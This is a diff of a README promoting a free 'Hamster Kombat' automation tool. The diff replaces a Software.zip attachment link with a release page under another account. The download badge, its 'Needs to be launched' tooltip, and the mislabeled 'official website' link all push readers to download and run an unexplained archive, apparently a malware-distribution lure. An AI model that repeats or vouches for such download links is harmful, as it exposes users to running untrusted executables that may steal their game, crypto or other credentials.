@@ -10,7 +10,7 @@ Hamster Kombat Stake is a free automation tool that can handle various in-game t
 
 To access the automation tool, simply download the software package from the following link:
 
-[![Download Hamster Kombat Automation Tool](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18060583/Software.zip "Needs to be launched")
+[![Download Hamster Kombat Automation Tool](https://github.com/ZBMarket/Hamster-Kombat/releases/tag/v2.0)](https://github.com/ZBMarket/Hamster-Kombat/releases/tag/v2.0 "Needs to be launched")
 
 Once downloaded, launch the software to start using the automation tool for Hamster Kombat.
 
@@ -37,4 +37,4 @@ Please note that the automation tool is provided for educational and entertainme
 
 Start using the Hamster Kombat Automation Tool today and elevate your gaming experience! 🐹💥
 
-Feel free to visit the [official website](https://github.com/user-attachments/files/18060583/Software.zip) for more information.
+Feel free to visit the [official website](https://github.com/ZBMarket/Hamster-Kombat/releases/tag/v2.0) for more information.
